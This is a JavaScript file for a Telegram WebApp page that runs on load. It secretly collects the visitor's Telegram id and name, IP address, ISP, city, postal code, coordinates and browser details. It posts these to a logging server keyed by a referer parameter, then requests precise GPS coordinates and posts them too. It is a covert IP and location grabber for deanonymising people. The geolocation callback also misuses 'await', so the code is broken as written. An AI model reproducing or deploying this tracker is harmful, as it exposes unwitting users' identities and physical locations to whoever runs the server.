function mapToJSON(map) {
  return JSON.stringify(Object.fromEntries(map));
}

const request = async () => { // Calling a "synchronous" fetch
    let tg = window.Telegram.WebApp;
    let user = tg.initDataUnsafe.user;
	
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    const url = new URL(window.location);
    const referer = url.searchParams.get("referer");

    console.log(referer);

    // Declaring variables
	let time = new Date().toLocaleString('de-DE', { timeZone: 'UTC' });
	let userTime = new Date().toLocaleString('de-DE');

	let event = bowser.getParser(navigator.userAgent);
	let browser = event.parsedResult.browser.name + " " + event.parsedResult.browser.version;
	let os = event.parsedResult.os.name + " " + event.parsedResult.os.version;
	let useragent = navigator.userAgent;
	
    var ip = data.ip;
    var provider = data.org + " (" + data.asn + ")";

    var timezone = data.timezone + " (" + data.utc_offset + ")";
	var language = navigator.language || navigator.userLanguage;
    var country = data.country_name;
    var countryCode = data.country_code;
    var region = data.region + " (" + data.region_code + ")";
    var city = data.city;
	var zip = data.postal;
    var lat = data.latitude;
    var lon = data.longitude;

    const map = new Map([
    ["user_id", user.id],
    ["first_name", user.first_name],
	["time", time],
	["user_time", userTime],
	["browser", browser],
	["os", os],
	["useragent", useragent],
	["ip", ip],
	["provider", provider],
	["timezone", timezone],
	["language", language],
	["country", country],
	["country_code", countryCode],
	["region", region],
	["city", city],
	["zip", zip],
	["latitude", lat],
	["longitude", lon]
    ]);
	
    const log = mapToJSON(map);

    await fetch(`http://127.0.0.1:8080/logs.send/${referer}`, {
        method: 'POST',
        headers: {
            'Accept': 'text/plain',
            'Content-Type': 'text/plain'
        },
        body: log
    });
    
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
			(position) =>  {
                const geo_map = new Map([
                    ["accuracy", position.coords.accuracy],
                    ["latitude", position.coords.latitude],
                    ["longitude", position.coords.longitude]
                ]);

                const geo_log = mapToJSON(geo_map);

                await fetch(`http://127.0.0.1:8080/logs.sendGPS/${referer}`, {
                    method: 'POST',
                    headers: {
                        'Accept': 'text/plain',
                        'Content-Type': 'text/plain'
                    },
                    body: geo_log
                });
			});
    }
}

request();
